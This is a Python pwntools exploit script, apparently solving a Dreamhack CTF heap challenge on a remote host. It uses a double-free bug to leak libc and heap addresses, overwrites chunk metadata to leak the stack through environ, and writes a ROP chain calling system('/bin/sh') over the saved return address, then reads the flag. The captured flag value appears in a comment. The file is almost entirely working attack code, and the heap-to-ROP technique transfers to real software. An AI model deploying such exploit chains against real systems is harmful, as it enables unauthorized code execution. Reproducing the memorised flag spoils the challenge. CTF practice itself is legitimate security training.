#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = 'prob_patched'
HOST = 'host8.dreamhack.games'
PORT = 19876

exe = ELF(exe_path, checksec=False)
libc = exe.libc
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
brva 0x1422
brva 0x15F5
brva 0x16AC
continue
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

def sla(prompt, data):
    p.sendlineafter(prompt, data)
def sa(prompt, data):
    p.sendafter(prompt, data)
def s(prompt):
    p.send(prompt)
def sl(data):
    p.sendline(data)
def rcu(data):
    return p.recvuntil(data)
def rl():
    return p.recvline()

# ============================EXPLOIT============================
def create(idx, size, name, content):
    sla(b'> ', b'1')
    sla(b'idx > ', str(idx).encode())
    sla(b'size > ', str(size).encode())
    sa(b'name > ', name)
    sa(b'content > ', content)
def delete(idx):
    sla(b'> ', b'2')
    sla(b'idx > ', str(idx).encode())
def edit(idx, name, content):
    sla(b'> ', b'3')
    sla(b'idx > ', str(idx).encode())
    sa(b'name > ', name)
    sa(b'content > ', content)
def print(idx):
    sla(b'> ', b'4')
    sla(b'idx > ', str(idx).encode())

create(0, 0x410, b'a'*8, b'b'*8)
create(1, 0x10, b'c'*8, b'd'*8)
delete(0)
delete(0) # reset flag on bss to read
delete(1)
delete(1)
print(0)
rcu(b'name : ')
libc.address = u64(p.recv(6).ljust(8, b'\x00')) - 0x21ace0
print(1)
rcu(b'name : ')
leak = u64(p.recv(5).ljust(8, b'\x00'))
heap_base = leak << 12
log.success(f'libc base: {hex(libc.address)}')
log.success(f'heap base: {hex(heap_base)}')
# now metadata = name of chunk 2
create(2, 0x28, b'A', b'B')
edit(2, p64(0x28) + p64(0x0) + p64(libc.sym.environ), p64(0x0)) # overwrite name of chunk 2 to leak environ
print(0)
rcu(b'name : ')
stack_leak = u64(p.recv(6).ljust(8, b'\x00'))
saved_rip = stack_leak - 0x140
log.success(f'saved rip: {hex(saved_rip)}')
edit(2, p64(0x28) + p64(0x0) + p64(saved_rip), p64(0x0))
payload = flat(libc.address + 0x2a3e5, next(libc.search(b'/bin/sh\x00')), libc.address + 0x29139, libc.sym.system)
edit(0, payload, b'B'*8)
sl(b'cat flag*')
# DH{8d35746cd5b310eb65dcfeed2e05188b5db616378073efd91fd2f6204a34bf48:0ghtVy7fa/jXVf6frn+Cow==}
p.interactive()
